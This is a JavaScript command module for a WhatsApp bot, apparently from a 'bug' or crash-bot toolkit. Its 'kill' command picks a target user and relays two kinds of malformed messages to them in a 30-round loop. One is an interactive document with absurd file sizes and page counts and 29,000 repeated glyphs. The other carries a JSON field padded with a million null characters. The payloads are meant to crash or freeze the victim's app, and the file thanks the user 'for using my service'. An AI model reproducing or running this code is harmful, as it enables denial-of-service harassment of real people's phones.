
import channelSender from '../commands/channelSender.js'

async function kill(message, client) {

    try {

        const remoteJid = message.key?.remoteJid;

        if (!remoteJid) {
            throw new Error("Message JID is undefined.");
        }

        await client.sendMessage(remoteJid, { text: "Attempting to bug the target" });

        // Normalize command input
        const messageBody = message.message?.extendedTextMessage?.text || message.message?.conversation || '';

        const commandAndArgs = messageBody.slice(1).trim(); // Remove prefix and trim
        const parts = commandAndArgs.split(/\s+/);
        const args = parts.slice(1); // Extract arguments

        let participant;

        // Handle reply to message
        if (message.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
            participant = message.message.extendedTextMessage.contextInfo.participant; // Quoted user's JID
        } else if (args.length > 0) {
            participant = args[0].replace('@', '') + '@s.whatsapp.net'; // Argument user JID
        } else {
            throw new Error('Specify the person to bug.');
        }

        const num = '@' + participant.replace('@s.whatsapp.net', '');

        // Execute the bug command

        for (let i = 0; i < 30; i++) {

            await bug2(message, client, participant);

            await bug1(message, client, participant);

            await bug1(message, client, participant);

            await new Promise(resolve => setTimeout(resolve, 1000));

        }


        await channelSender(message, client, "Succceded in sending bug to the target.\n\nThanks for using my service.", 4);

    } catch (error) {
        console.error("An error occurred while trying to bug the target:", error);
        await client.sendMessage(message.key.remoteJid, { text: `An error occurred while trying to bug the target: ${error.message}` });
    }
}

async function bug1(message, client, participant) {
    try {
        const remoteJid = participant;

        await client.relayMessage(
            remoteJid,
            {
                ephemeralMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                documentMessage: {
                                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc",
                                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                    fileLength: "9999999999999",
                                    pageCount: 1316134911,
                                    mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                                    fileName: "Document",
                                    fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                                    directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc",
                                    mediaKeyTimestamp: "1726867151",
                                    contactVcard: true,
                                    jpegThumbnail: "BASE64_ENCODED_THUMBNAIL_HERE"
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: `⿻Senku love you\n${"ꦾ".repeat(29000)}\n\n`
                            },
                            nativeFlowMessage: {

                                nativeFlowMessage: {

                                    name: 'galaxy_message',
                                    
                                    paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"AdvanceBug\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"attacker@zyntzy.com\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(1020000)}\",\"screen_0_TextInput_1\":\"\u0003\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                                        
                                    version: 3
                                },
                            },
                            contextInfo: {
                                mentionedJid: ["6289526156543@s.whatsapp.net"],
                                forwardingScore: 1,
                                isForwarded: true,
                                fromMe: false,
                                participant: "0@s.whatsapp.net",
                                remoteJid: "status@broadcast",
                                quotedMessage: {
                                    documentMessage: {
                                        url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc",
                                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                        fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                        fileLength: "9999999999999",
                                        pageCount: 1316134911,
                                        mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                                        fileName: `Dev Senku`,
                                        fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                                        directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc",
                                        mediaKeyTimestamp: "1724474503",
                                        contactVcard: true,
                                        jpegThumbnail: "BASE64_ENCODED_THUMBNAIL_HERE"
                                    }
                                }
                            }
                        }
                    }
                }
            },
            { participant: { jid: remoteJid } }
        );

    } catch (error) {
        console.error("Error in bug1:", error);
    }
}

async function bug2(message, client, participant){

    const target = participant;

    await client.relayMessage(target, 

            {
                viewOnceMessage: {

                    message: {

                        interactiveResponseMessage: {

                            body: {

                                text: "Damn I am in love with you......",

                                format: "EXTENSIONS_1"
                            },
                            nativeFlowResponseMessage: {

                                name: 'galaxy_message'
                                ,
                                paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"AdvanceBug\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"attacker@zyntzy.com\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(1020000)}\",\"screen_0_TextInput_1\":\"\u0003\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                                
                                version: 3
                            }
                        }
                    }
                }
            }, 
            { participant: { jid: target } }
        );
    }



export default kill;
